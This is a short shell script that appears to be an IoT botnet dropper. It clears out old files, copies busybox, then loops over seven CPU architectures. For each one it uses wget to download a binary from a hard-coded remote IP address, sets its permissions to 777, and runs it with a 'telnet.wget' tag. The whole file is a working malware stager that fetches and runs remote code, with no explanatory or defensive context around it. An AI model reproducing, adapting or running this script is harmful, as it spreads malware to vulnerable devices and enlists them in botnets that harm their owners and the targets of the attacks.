#!/bin/sh

rm -rf XKJDSA
rm -rf PRTQWE
rm -rf AFGHTY
rm -rf NVBXUE
rm -rf WLOPKJ
rm -rf DFGJHS
rm -rf SDVXCV

cp /bin/busybox busybox

/bin/busybox wget http://84.247.129.206/arm     -O- > XKJDSA; chmod 777 XKJDSA; ./XKJDSA telnet.wget
/bin/busybox wget http://84.247.129.206/arm5    -O- > PRTQWE; chmod 777 PRTQWE; ./PRTQWE telnet.wget
/bin/busybox wget http://84.247.129.206/arm7    -O- > AFGHTY; chmod 777 AFGHTY; ./AFGHTY telnet.wget
/bin/busybox wget http://84.247.129.206/mips    -O- > NVBXUE; chmod 777 NVBXUE; ./NVBXUE telnet.wget
/bin/busybox wget http://84.247.129.206/mpsl    -O- > WLOPKJ; chmod 777 WLOPKJ; ./WLOPKJ telnet.wget
/bin/busybox wget http://84.247.129.206/arc     -O- > DFGJHS; chmod 777 DFGJHS; ./DFGJHS telnet.wget
/bin/busybox wget http://84.247.129.206/aarch64 -O- > SDVXCV; chmod 777 SDVXCV; ./SDVXCV telnet.wget
